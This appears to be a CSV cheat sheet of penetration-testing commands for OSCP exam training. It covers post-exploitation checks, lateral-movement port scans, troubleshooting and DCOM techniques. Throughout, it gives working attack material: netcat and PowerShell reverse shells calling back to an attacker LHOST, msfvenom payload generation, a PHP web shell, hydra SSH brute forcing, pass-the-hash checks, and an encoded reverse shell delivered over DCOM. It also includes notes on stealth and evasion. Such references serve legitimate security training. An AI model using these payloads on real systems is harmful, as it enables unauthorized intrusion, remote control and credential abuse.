443 (HTTPS - often allowed outbound), 4444 (default Metasploit), 80 (HTTP), 53 (DNS).

LISTENER TIMING:
Start listener BEFORE executing reverse shell payload on target.

RLWRAP RECOMMENDATION:
Use 'rlwrap nc -lvnp <LPORT>' for better interactivity (arrow keys, command history).

STABILIZATION:
Raw Netcat shells are unstable - stabilize with:
python -c 'import pty;pty.spawn(""/bin/bash"")' then Ctrl+Z, stty raw -echo; fg.

ALTERNATIVE:
pwncat-cs provides built-in stabilization, file upload/download, persistence modules.

BEHIND THE SCENES:
Netcat binds to port, accepts TCP connection, bidirectional data transfer (stdin/stdout).

TIME ESTIMATE:
<10 seconds to start listener.

EXAM TIP:
Always start listener before executing payload.

Use rlwrap for better UX.

Keep listener in tmux/screen pane for persistence.","high"
"verify-root-access-ad","Helper - Verify Remote Access and Privileges","active-directory","whoami; hostname; whoami /priv","Quick verification commands to confirm remote shell access, identify target system, and check privilege level","lateral-movement","EDUCATIONAL CONTEXT:
First commands to run after obtaining remote shell - verify access and assess privilege level.

WHY THESE COMMANDS:
whoami confirms user context, hostname confirms target, whoami /priv shows available privileges for escalation.

SYSTEM vs ADMIN:
NT AUTHORITY\SYSTEM is highest privilege (kernel-level), local admin is high but not SYSTEM.

PRIVILEGE ESCALATION:
If SeImpersonatePrivilege present, can use Juicy Potato/PrintSpoofer/RoguePotato for SYSTEM.

COMMON CONTEXTS:
PSExec→SYSTEM, WMI→user, WinRM→user, DCOM→user.

GROUP MEMBERSHIP:
whoami /groups shows if user in Administrators local group.

SID IDENTIFICATION:
whoami /all shows SID - useful for token manipulation.

TIME ESTIMATE:
<10 seconds to run all three commands.

EXAM TIP:
Always verify access immediately after shell obtained - confirms success and informs next steps (credential dump if SYSTEM, PrivEsc if user).","high"
"lateral-movement-port-check","Helper - Quick Port Check for Lateral Movement Options","active-directory","sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v <TARGET>","Rapidly scan common lateral movement ports on target to determine available attack vectors","lateral-movement","EDUCATIONAL CONTEXT:
Quick reconnaissance to determine viable lateral movement vectors before attempting exploitation.

PORT MEANINGS:
135=RPC (WMI/DCOM), 445=SMB (PSExec/SMBExec), 5985=WinRM HTTP, 5986=WinRM HTTPS, 3389=RDP.

TECHNIQUE MAPPING:
Use port availability to select lateral movement technique (see decision tree).

FAST SCAN:
Only 5 ports - completes in <1 minute vs full 65535 port scan.

TECHNIQUE PRIORITY:
If multiple ports open, try WinRM first (cleanest), then PSExec (most reliable), then WMI/DCOM (stealthier).

COMPARISON:
More targeted than full nmap scan, faster than testing each technique individually.

SERVICE DETECTION:
-sV identifies exact service version (e.g., WinRM vs generic HTTP on 5985).

BEHIND THE SCENES:
Nmap sends SYN packets to ports, analyzes responses, fingerprints services with version probes.

TIME ESTIMATE:
30 seconds to 1 minute for port scan.

EXAM TIP:
Run this immediately after identifying target to plan lateral movement approach.

Saves time by focusing on available techniques only.","high"
"lateral-movement-troubleshooting","Helper - Troubleshoot Common Lateral Movement Failures","active-directory","# Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>
# Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares
# Test hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM>
# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH
# Verify ports: sudo nmap -p 135,445,5985 -Pn -v <TARGET>
# Check firewall: Test-NetConnection <TARGET> -Port <PORT> from Windows
# Time sync: net time \\<DC> (Kerberos requires <5 min time skew)
# Service status: Get-Service WinRM,RpcSs -ComputerName <TARGET>","Systematic troubleshooting guide for diagnosing authentication failures, connection timeouts, and access denied errors","lateral-movement","EDUCATIONAL CONTEXT:
Systematic troubleshooting framework for lateral movement failures - saves exam time.

COMMON CAUSES:
1) Invalid credentials (most common), 2) User not admin (second most common), 3) UAC remote restrictions (hash-based auth), 4) Firewall blocking ports, 5) Time skew (Kerberos), 6) Service disabled.

TROUBLESHOOTING ORDER:
Test credentials → Verify admin access → Check ports → Verify services → Check time sync.

UAC LIMITATION:
2014 KB2871997 patch blocks local admin pass-the-hash for non-RID-500 accounts (domain users unaffected).

CRACKMAPEXEC VERIFICATION:
Always test with CME before full exploitation - fastest way to verify credentials and admin access.

PWNED MEANING:
[+] Pwn3d! indicator confirms user has local administrator rights (can PSExec/WMI).

TIME SKEW:
Kerberos authentication fails if clock difference >5 minutes from DC - sync with ntpdate or net time.

FIREWALL:
If ports show 'filtered' in nmap, lateral movement impossible without pivoting.

SERVICE DEPENDENCIES:
WinRM requires WinRM service, WMI requires RpcSs (RPC), PSExec requires Server service.

TIME ESTIMATE:
5-10 minutes for full troubleshooting workflow.

EXAM TIP:
Don't waste time on blocked techniques - verify prerequisites first, pivot to alternatives if blocked.","high"
"nc-reverse-shell","Netcat Reverse Shell","exploitation","nc -e /bin/bash <LHOST> <LPORT>","Netcat reverse shell with execute","","Not all netcat versions support -e flag","high"
"powershell-reverse-shell","PowerShell Reverse Shell","exploitation","powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""","PowerShell TCP reverse shell","","Use -exec bypass for execution policy issues","high"
"msfvenom-linux-elf","MSFVenom Linux Binary","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>","Generate Linux reverse shell binary","","Check target architecture (x86 vs x64)","high"
"msfvenom-windows-exe","MSFVenom Windows Binary","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > <FILE>","Generate Windows reverse shell executable","","May trigger AV, consider encoding","high"
"searchsploit","Searchsploit Exploit Search","exploitation","searchsploit <SERVICE> <VERSION>","Search for exploits in Exploit-DB","","Use -x to examine exploit code, -m to copy","high"
"hydra-ssh","SSH Brute Force","exploitation","hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET>","Brute force SSH login","","Use -t to limit threads and avoid detection","medium"
"web-shell-php","Simple PHP Web Shell","exploitation","<?php system($_GET['cmd']); ?>","Minimal PHP web shell","","Access with: ?cmd=whoami","high"
"searchsploit-cve-lookup","Searchsploit CVE Lookup","exploitation","searchsploit --cve <CVE_ID>","Search Exploit-DB by specific CVE identifier","general","ExploitDB is local database (/usr/share/exploitdb/), no internet required during OSCP exam.

Always read exploit code before execution - look for IP/port hardcoded values, required libraries (pip install), compilation steps (gcc), and target OS compatibility.

Time estimate:
2-5 minutes for research, 10-30 minutes for exploit modification.","high"
"searchsploit-service-version","Searchsploit Service and Version","exploitation","searchsploit <SERVICE> <VERSION>","Search exploits by service name and version number","general","Search strategy:
Start with full version, then try partial (major.minor only).

Exclude noise with --exclude='dos|poc|denial'.

Common OSCP services:
Apache, ProFTPD, vsftpd, Samba, OpenSSH, MySQL, PostgreSQL, IIS, Tomcat.

Read exploit code for:
1) Target OS (Linux/Windows), 2) Authentication required, 3) Dependencies (Python 2 vs 3, libraries), 4) Compilation needed (C code:
gcc exploit.c -o exploit).

Time estimate:
1-3 minutes.","high"
"searchsploit-copy-exploit","Searchsploit Copy Exploit","exploitation","searchsploit -m <EDB_ID>","Copy exploit from ExploitDB to current working directory","general","Exploit modification checklist:
1) IP addresses (target and attacker LHOST), 2) Ports (listener LPORT), 3) File paths (uploads, shells), 4) Credentials if needed, 5) Python version (python vs python3), 6) Required libraries (pip install requests beautifulsoup4).

Common modifications for Python exploits:
Change 'import urllib2' to 'import urllib.request' for Python 3.

For C exploits:
Compile with 'gcc -o exploit exploit.c' (add -m32 for 32-bit).

Time estimate:
2-5 minutes to copy and review, 10-30 minutes to modify.","high"
"nmap-script-help","Nmap Script Documentation","exploitation","nmap --script-help <SCRIPT_NAME>","Display NSE script documentation and usage examples","general","NSE script categories:
'auth' (authentication bypass/brute), 'brute' (password guessing), 'default' (standard enumeration), 'discovery' (network discovery), 'dos' (denial of service - AVOID IN OSCP), 'exploit' (vulnerability exploitation), 'external' (requires internet), 'fuzzer' (fuzzing), 'intrusive' (may crash services), 'malware' (malware detection), 'safe' (non-intrusive), 'version' (version detection), 'vuln' (vulnerability checking).

OSCP-safe categories:
safe, default, vuln, discovery.

Useful script patterns:
http-vuln-* (web vulns), smb-vuln-* (SMB vulns), ftp-* (FTP enum), ssh-* (SSH enum).

Time estimate:
1-2 minutes to read docs.","high"
"nmap-script-args","Nmap Script with Arguments","exploitation","sudo nmap -sV -Pn -v --script <SCRIPT_NAME> --script-args <ARGUMENTS> -p <PORT> <TARGET>","Execute NSE script with custom arguments for targeted enumeration","general","Common OSCP NSE scripts with args:
1) http-form-brute:
--script-args 'userdb=users.txt,passdb=pass.txt,http-form-brute.path=/login.php,http-form-brute.method=POST' 2) smb-brute:
--script-args userdb=users.txt,passdb=pass.txt 3) ftp-brute:
--script-args userdb=users.txt,passdb=pass.txt 4) ssh-brute:
--script-args userdb=users.txt,passdb=pass.txt 5) mysql-brute:
--script-args userdb=users.txt,passdb=pass.txt.

Always test scripts safely:
Use --script-args 'safe=1' when available.

Time estimates:
brute scripts (5-60 minutes depending on wordlist), vuln scripts (30 seconds - 2 minutes), enum scripts (1-5 minutes).

Exam tip:
Avoid DOS category scripts, they may crash targets.","high"
"gobuster-dir-common","Gobuster Directory Common Wordlist","exploitation","gobuster dir -u http://<TARGET>:<PORT> -w /usr/share/wordlists/dirb/common.txt -t <THREADS> -x <EXTENSIONS>","Fast directory brute force with common wordlist (4600 entries)","general","Wordlist sizes and time estimates (30 threads):
1) common.txt (4,614 entries) - 2-5 minutes, 2) directory-list-2.3-small.txt (87,664) - 10-20 minutes, 3) directory-list-2.3-medium.txt (220,560) - 30-60 minutes, 4) big.txt (20,469) - 5-10 minutes.

Extension strategy:
Linux (php,html,txt,sh), Windows (asp,aspx,html,txt), Java (jsp,jspa,do,action).

OSCP exam tip:
Start with common.txt first (quick wins), then run medium wordlist in background.

Status code meanings:
200=accessible, 301/302=redirect (follow), 401=auth required (bruteforce?), 403=forbidden (try bypass with encodings or methods), 500=server error (potential injection?).

Thread optimization:
Exam network may have rate limits, test with 10 threads first, increase to 30-50 if stable.","high"
"gobuster-dir-custom","Gobuster Directory Custom Deep Scan","exploitation","gobuster dir -u http://<TARGET>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <THREADS> -x <EXTENSIONS> -b <BLACKLIST> -o <OUTPUT>","Deep directory enumeration with large wordlist and filtering","general","Wordlist selection strategy:
1) Start with common.txt (quick wins, 2-5 min), 2) Run directory-list-2.3-small.txt (medium depth, 10-20 min), 3) If time permits:
directory-list-2.3-medium.txt (deep scan, 30-60 min).

Extension strategy by platform:
Apache/Linux (php,txt,html,sh,bak), IIS/Windows (asp,aspx,config,txt,bak), Tomcat/Java (jsp,do,action,war), Generic (html,txt,zip,tar,gz,sql,log).

Status code interpretation:
200 (access granted - investigate), 301/302 (redirect - follow with -r), 401 (auth required - potential brute force), 403 (forbidden - try bypass techniques:
path traversal, case manipulation, method change), 500 (server error - may indicate injection point).

OSCP exam strategy:
Run medium wordlist in background (tmux/screen), focus on quick wins first, return to deep scan results after initial enum.

Time management:
Allocate 30-60 minutes max for deep scans, move on if not productive.","medium"
"nikto-comprehensive","Nikto Web Vulnerability Scanner","exploitation","nikto -h http://<TARGET>:<PORT> -C all -output <OUTPUT>","Comprehensive web server vulnerability and misconfiguration scanner","general","Nikto scan characteristics:
1) Noisy - generates significant log entries (IDS/IPS will detect), 2) Comprehensive - checks 6700+ items, 3) Slow - 10-20 minutes typical, 4) False positives - always verify findings manually.

OSCP exam considerations:
Run AFTER manual enumeration and gobuster (nikto is noisy), Run in background (tmux/screen session), Focus on findings that match target OS/service versions, Ignore generic findings (e.g., 'X-Frame-Options missing' unless relevant).

Tuning options:
1 (Interesting files), 2 (Misconfiguration), 3 (Info disclosure), 4 (Injection:
XSS/SQLi/etc), 5 (Remote file retrieval), 6 (Denial of service - AVOID), 7 (Remote file retrieval), 8 (Command execution), 9 (SQL injection), 0 (File upload), a (Authentication bypass), b (Software identification), c (Remote source inclusion).

Recommended tuning:
-Tuning 1,2,3,4,8,b (skip DOS).

Time estimate:
Full scan 10-20 minutes, Tuned scan 5-10 minutes.

Post-scan workflow:
grep OSVDB/CVE → searchsploit → manual verification → exploitation.","high"
"dcom-verify-rpc-port","DCOM - Verify RPC Port 135 Accessible","active-directory","Test-NetConnection <TARGET> -Port 135","Test RPC port 135 accessibility for DCOM lateral movement using Test-NetConnection from PowerShell","lateral-movement","OSCP TRAINING MATERIAL - DCOM RPC PORT VERIFICATION:
WHAT IS DCOM:
Distributed Component Object Model - Microsoft technology enabling software components to communicate across networked computers.

Allows remote COM object instantiation and method invocation over RPC.

PORT REQUIREMENTS (CRITICAL):
- TCP 135:
RPC endpoint mapper (required for initial connection)
- TCP 49152-65535:
Ephemeral/dynamic ports (actual DCOM communication)
- Both ranges must be accessible for DCOM to work

WHY VERIFY PORT 135:
From training context, before attempting DCOM lateral movement, verify RPC accessibility:
```powershell
Test-NetConnection 192.168.50.73 -Port 135
```

If TcpTestSucceeded:
True → DCOM possible
If TcpTestSucceeded:
False → DCOM blocked, use alternative (WMI, WinRM, PSExec)

RPC ENDPOINT MAPPER ROLE:
Port 135 is RPC endpoint mapper:
1.

Client connects to port 135
2.

Requests service (e.g., DCOM)
3.

Mapper returns dynamic port number (49152-65535 range)
4.

Client connects to dynamic port for actual communication

DCOM vs WMI:
Both use RPC (port 135) but different protocols:
- WMI:
Windows Management Instrumentation over DCOM/RPC
- DCOM:
Direct COM object manipulation over RPC
- Different security contexts and logging
- DCOM alternative when WMI specifically blocked/monitored

FIREWALL BEHAVIOR:
Windows Firewall rules:
- Domain networks:
RPC allowed by default
- Public/Private networks:
Often blocked
- OSCP exam:
Typically domain environment (RPC accessible)

VERIFICATION OUTPUT:
Success:
```
ComputerName     :
192.168.50.73
RemoteAddress    :
192.168.50.73
RemotePort       :
135
TcpTestSucceeded :
True
```

Failure:
```
TcpTestSucceeded :
False
PingSucceeded    :
True/False
```

TIME ESTIMATE:
<10 seconds.

EXAM STRATEGY:
Always verify port 135 before attempting DCOM to avoid wasting time.","medium"
"dcom-mmc20-calc-poc","DCOM - MMC20.Application Calculator PoC","active-directory","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""<TARGET>"")); $dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")","Execute calculator on remote system via DCOM MMC20.Application (proof-of-concept test before deploying reverse shell)","lateral-movement","OSCP TRAINING MATERIAL - DCOM LATERAL MOVEMENT WITH MMC20.APPLICATION:
TRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):
From CLIENT74 as jen (domain user, local admin on FILES04), executing calculator on FILES04 (192.168.50.73):
```powershell
PS C:\Users\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
PS C:\Users\jen> $dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")
```

No errors returned = success.

WHAT IS DCOM LATERAL MOVEMENT:
Technique using Distributed Component Object Model to instantiate COM objects remotely and execute commands on target systems.

Alternative to WMI/WinRM/PSExec for lateral movement.

WHY USE DCOM:
- Alternative when WMI specifically blocked/monitored
- Different attack vector (evasion)
- No service creation (unlike PSExec)
- Fileless execution (no binary upload)
- Uses legitimate Windows functionality

MMC20.APPLICATION COM OBJECT:
Microsoft Management Console (MMC) exposes automation interface:
- ProgID:
MMC20.Application.1
- Purpose:
Legitimate MMC scripting/automation
- Method:
Document.ActiveView.ExecuteShellCommand
- Abuse:
Remote command execution

DISCOVERY:
- Researcher:
Matt Nelson (@enigma0x3)
- Year:
2017
- Documentation:
Cybereason, Enigma0x3 blog
- Multiple DCOM objects identified for lateral movement

TRAINING SCENARIO CONTEXT:
- SOURCE:
CLIENT74 (compromised Windows client)
- ATTACKER:
jen (domain user with local admin rights on FILES04)
- TARGET:
FILES04 (192.168.50.73) - Windows Server
- GOAL:
Proof-of-concept command execution via DCOM

HOW MMC20 DCOM WORKS:
Step 1:
CreateInstance
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
```
- System.Activator:
.NET class for COM activation
- CreateInstance:
Instantiates COM object
- GetTypeFromProgID:
Converts ProgID to Type
- ""MMC20.Application.1"":
MMC COM class identifier
- ""192.168.50.73"":
Target IP/hostname

Result:
$dcom variable contains remote MMC object reference.

Step 2:
ExecuteShellCommand
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand(""cmd"",$null,""/c calc"",""7"")
```
- Document:
MMC Document interface
- ActiveView:
Active console view
- ExecuteShellCommand:
Method to run shell commands
- Four parameters:
  1.

""cmd"":
Command interpreter
  2.

$null:
Working directory (null = default)
  3.

""/c calc"":
Command arguments (run calculator then exit)
  4.

""7"":
Window state (7=minimized, 0=hidden, 1=normal)

Result:
Calculator spawns on FILES04.

SESSION 0 BEHAVIOR (CRITICAL UNDERSTANDING):
From training, calculator NOT visible on FILES04 desktop because:
Session Isolation:
- Session 0:
System services, non-interactive processes
- Session 1+:
User desktop sessions (interactive)
- DCOM spawns processes in Session 0
- GUI applications invisible to logged-in users

Training explicitly states:
""Unfortunately, we won't see calc.exe starting since the process is spawned in session 0.""

VERIFICATION:
From training, confirm execution via remote PowerShell:
```powershell
PS C:\Users\jen> Invoke-Command -ComputerName 192.168.50.73 -ScriptBlock {Get-Process calc}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    141       8     7924      21292       0.11   4724   0 calc
```

SI (Session ID) = 0 confirms Session 0 execution.

Alternative verification:
```powershell
tasklist /S 192.168.50.73 | findstr calc
```

PREREQUISITES (FROM TRAINING):
1.

Local administrator access on target
   - jen was local admin on FILES04
   - Verify with:
net user jen /domain
2.

RPC port 135 accessible
   - Test:
Test-NetConnection 192.168.50.73 -Port 135
3.

Ephemeral ports accessible (49152-65535)
   - Windows Firewall allows by default in domain environments

PORT DETAILS:
- TCP 135:
RPC endpoint mapper (initial connection)
- TCP 49152-65535:
Dynamic ports (actual DCOM communication)
- Same ports as WMI (both use DCOM/RPC)

WHY CALCULATOR AS PoC:
From training methodology:
1.

Harmless - won't damage target
2.

Easy to verify - check process list
3.

Confirms technique works before deploying reverse shell
4.

Standard penetration testing practice

FOUR EXECUTESHELLCOMMAND PARAMETERS:
Parameter 1:
Command
- Examples:
""cmd"", ""powershell"", ""C:\\Windows\\System32\\cmd.exe""
- Training used:
""cmd""

Parameter 2:
Directory
- Working directory for command
- $null = default (C:\Windows\System32 typically)
- Can specify custom:
""C:\\Temp""

Parameter 3:
Parameters
- Command arguments
- Training:
""/c calc"" (run calc then exit cmd)
- Reverse shell:
""powershell -nop -w hidden -e <BASE64>""

Parameter 4:
WindowState
- 0:
Hidden
- 1:
Normal
- 7:
Minimized
- Training used:
""7"" (minimized, though invisible in Session 0 anyway)

BEHIND THE SCENES:
1.

PowerShell contacts RPC endpoint mapper (port 135) on target
2.

Requests DCOM service
3.

RPC mapper returns dynamic port
4.

DCOM connection established on dynamic port
5.

MMC20 COM object instantiated remotely
6.

ExecuteShellCommand invoked via DCOM
7.

Target spawns cmd.exe process in Session 0
8.

cmd.exe runs /c calc (calculator)
9.

Process remains running until manually terminated

COMPARISON TO OTHER TECHNIQUES:
PSExec:
- Uploads binary (psexesvc.exe)
- Creates service
- SYSTEM shell
- Noisy (Event ID 7045)

WMI:
- Uses WMI protocol
- Fileless
- Session 0 execution
- Different API calls

DCOM MMC20:
- Uses DCOM protocol
- Fileless
- Session 0 execution
- Different signature than WMI
- Alternative vector for evasion

TIME ESTIMATE:
- Command execution:
10-30 seconds
- Verification:
10-20 seconds
- Total:
1-2 minutes

EXAM STRATEGY:
1.

Always test with calculator PoC first
2.

Verify process created (Invoke-Command Get-Process)
3.

If PoC succeeds, upgrade to reverse shell
4.

If PoC fails, troubleshoot before wasting time on payload

COMMON FAILURES:
Exception calling CreateInstance:
- RPC unavailable:
Check port 135
- DCOM disabled:
Try alternative (WMI, WinRM)
- Firewall blocking:
Verify ephemeral ports

Access denied:
- Not local admin:
Verify permissions
- UAC blocking:
Use RID 500 or domain user

No error but calc not running:
- May have succeeded but Session 0
- Always verify with Get-Process, not GUI

FORENSIC ARTIFACTS:
- Event ID 4688:
Process creation (calc.exe)
- RPC network traffic on port 135
- DCOM activation (Event ID 10016 if blocked)
- Process spawned by svchost.exe (DCOM host)
- No service creation events (unlike PSExec)","high"
"dcom-mmc20-revshell","DCOM - MMC20.Application Reverse Shell","active-directory","$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""<TARGET>"")); $dcom.Document.ActiveView.ExecuteShellCommand(""powershell"",$null,""powershell -nop -w hidden -e <BASE64_PAYLOAD>"",""7"")","Deploy base64-encoded PowerShell reverse shell via DCOM MMC20.Application for interactive remote access","lateral-movement","OSCP TRAINING MATERIAL - DCOM REVERSE SHELL VIA MMC20.APPLICATION:
TRAINING EXAMPLE (FROM OSCP MODULE):
After successful calculator PoC, training demonstrates upgrading to reverse shell:
```powershell
PS C:\Users\jen> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application.1"",""192.168.50.73""))
PS C:\Users\jen> $dcom.Document.ActiveView.ExecuteShellCommand(""powershell"",$null,""powershell -nop -w hidden -e <BASE64_PAYLOAD>"",""7"")
```

Before execution, Netcat listener set up on Kali:
```bash
kali$ nc -lvnp 443
listening on [any] 443 ...
```

After DCOM command, reverse shell connects:
```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.73] 51138
PS C:\Windows\system32>
```

WHAT IS DCOM REVERSE SHELL:
Combines DCOM lateral movement with base64-encoded PowerShell reverse shell payload for full interactive remote access from attacker's machine.

UPGRADE FROM PoC:
Calc PoC:
`/c calc` (proof technique works)
Reverse shell:
`powershell -nop -w hidden -e <BASE64>` (full shell access)

PAYLOAD STRUCTURE:
From training context:
```powershell
""powershell -nop -w hidden -e <BASE64_PAYLOAD>""
```

Flags:
- -nop:
No PowerShell profile (faster, stealthier)
- -w hidden:
Hidden window (no visible console)
- -e:
Encoded command (base64-encoded reverse shell)

BASE64 PAYLOAD:
Example reverse shell PowerShell (before encoding):
```powershell
$client = New-Object System.Net.Sockets.TCPClient(""192.168.119.5"",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + ""PS "" + (pwd).Path + ""> "";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

Convert to base64:
```powershell
$Text = '$client = New-Object...(full payload)...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```

LISTENER SETUP:
From training, before executing DCOM command:
```bash
nc -lvnp 443
```

- nc:
Netcat
- -l:
Listen mode
- -v:
Verbose
- -n:
No DNS resolution
- -p 443:
Port 443 (common for evasion - looks like HTTPS)

REVERSE SHELL FLOW:
1.

Attacker:
Set up Netcat listener on Kali (nc -lvnp 443)
2.

Attacker:
Execute DCOM command from CLIENT74
3.

DCOM:
Instantiates MMC20 on FILES04
4.

MMC20:
Spawns PowerShell process on FILES04
5.

PowerShell:
Decodes base64 payload
6.

PowerShell:
Executes decoded script
7.

Script:
Creates TCP connection from FILES04 to Kali:443
8.

Connection:
Reverse shell established
9.

Attacker:
Interactive PowerShell on FILES04

PORT SELECTION:
- Training used:
443 (HTTPS)
- Common choices:
443, 80, 53 (blend with normal traffic)
- Avoid:
Non-standard ports (easier to detect)
- Firewall consideration:
Outbound 443/80 usually allowed

SESSION 0 CONTEXT:
- Reverse shell runs in Session 0 (system services)
- Not visible to logged-in users
- No GUI console window
- Process parent:
svchost.exe (DCOM host)

EXECUTION PRIVILEGES:
- Shell runs as:
jen (user who has local admin on FILES04)
- Not SYSTEM (unlike PSExec)
- User-level privileges
- Can potentially escalate to SYSTEM

WHY USE DCOM OVER ALTERNATIVES:
- WMI blocked/monitored:
DCOM different protocol/signature
- WinRM not enabled:
DCOM uses RPC instead
- PSExec too noisy:
DCOM no service creation
- Evasion:
Different attack vector

COMPARISON:
PSExec (Impacket/Sysinternals):
- Can execute from Kali or Windows
- SYSTEM shell
- Service creation (Event ID 7045)
- Binary upload (psexesvc.exe)
- Very well-known signature

DCOM MMC20:
- Requires Windows pivot point
- User shell (jen)
- No service creation
- Fileless (no binary upload)
- Less common signature

STEALTH BENEFITS:
- No binary written to disk
- No service creation
- Encoded payload (reduces AV signatures)
- Legitimate DCOM/MMC usage (harder to detect)
- Process appears as normal PowerShell

DISADVANTAGES:
- Requires compromised Windows host (can't run from Kali)
- More complex than PSExec
- User-level shell (not SYSTEM)
- Depends on PowerShell not being blocked

TIME ESTIMATE:
- Payload generation:
2-3 minutes
- Listener setup:
30 seconds
- DCOM execution:
30-60 seconds
- Total:
3-5 minutes

EXAM STRATEGY:
1.

Pre-generate base64 payloads before exam
2.

Test calculator PoC first
3.

If calc succeeds, deploy reverse shell
4.

Set up listener BEFORE executing DCOM command
5.

Verify LHOST/LPORT match payload
6.

If connection fails, check firewall/payload

PAYLOAD GENERATION TOOLS:
- revshells.com (online generator)
- PowerShell manual encoding
- Metasploit:
msfvenom -p windows/x64/shell_reverse_tcp

COMMON FAILURES:
No callback received:
- Wrong LHOST/LPORT in payload
- Listener not running
- Outbound firewall blocking
- Payload execution failed

Verify payload:
```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))
```

Connection drops immediately:
- Syntax error in payload
- PowerShell execution policy blocking
- AV detection

FORENSIC ARTIFACTS:
- Event ID 4688:
PowerShell process creation
- Network connection:
FILES04 → Kali:443
- PowerShell process:
Parent svchost.exe (DCOM)
- No service creation (unlike PSExec)
- RPC traffic on port 135
- DCOM activation events","high"
"dcom-shellwindows","DCOM - ShellWindows COM Object","active-directory","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"",""<TARGET>"")); $item = $dcom.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c <COMMAND>"",""C:\Windows\System32"",$null,0)","Alternative DCOM lateral movement using ShellWindows COM object (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39)","lateral-movement","EDUCATIONAL CONTEXT:
ShellWindows is alternative DCOM technique for lateral movement - less reliable than MMC20 but useful for evasion.

WHY USE THIS:
Different DCOM vector if MMC20 monitored/blocked by security tools.

RELIABILITY:
Less reliable than MMC20 - depends on active Explorer shell instances (requires logged-in user).

WHEN TO USE:
When you need DCOM diversity for evasion, MMC20 blocked, or testing different vectors.

BEHIND THE SCENES:
Accesses Explorer shell COM object, uses ShellExecute method to run commands.

LIMITATIONS:
Requires user logged in with Explorer running (Session 0 services don't have ShellWindows instances).

COMPARISON:
MMC20 (always available, more reliable) vs ShellWindows (user-dependent, less reliable).

TIME ESTIMATE:
2-3 minutes for testing.

EXAM TIP:
Stick with MMC20 for reliability unless specifically blocked - ShellWindows mainly for research/evasion.","medium"
"dcom-shellbrowserwindow","DCOM - ShellBrowserWindow COM Object","active-directory","$dcom = [Activator]::CreateInstance([type]::GetTypeFromCLSID(""C08AFD90-F2A1-11D1-8455-00A0C91F3880"",""<TARGET>"")); $dcom.Document.Application.ShellExecute(""cmd.exe"",""/c <COMMAND>"",""C:\Windows\System32"",$null,0)","DCOM lateral movement using ShellBrowserWindow COM object (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880)","lateral-movement","EDUCATIONAL CONTEXT:
ShellBrowserWindow is third DCOM technique for lateral movement - similar limitations to ShellWindows.

WHY EXISTS:
Provides multiple DCOM vectors for evasion and diversity when one technique monitored.

RELIABILITY:
Low - depends on active browser window instances (requires logged-in user).

WHEN TO USE:
Research, evasion scenarios, or when MMC20/ShellWindows both blocked.

COMPARISON:
MMC20 (always works) > ShellWindows (Explorer dependency) ≈ ShellBrowserWindow (browser dependency).

BEHIND THE SCENES:
Accesses browser shell COM object, calls ShellExecute method.

LIMITATIONS:
Requires user logged in with browser window open - not reliable for automation.

TIME ESTIMATE:
2-3 minutes for testing.

EXAM TIP:
Use MMC20 for OSCP - ShellBrowserWindow mainly for research/evasion.

Focus on reliable techniques (MMC20, WMI, PSExec, WinRM) for exam efficiency.","medium"
"msf-handler-setup","Set Up Multi/Handler for Reverse Shell","exploitation","use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run","Configure generic handler to receive incoming reverse shells from various payload types","metasploit","CRITICAL:
Payload type must match EXACTLY (windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp).

Staged (/) requires multi/handler.

Non-staged (_) works with nc or multi/handler.","high"
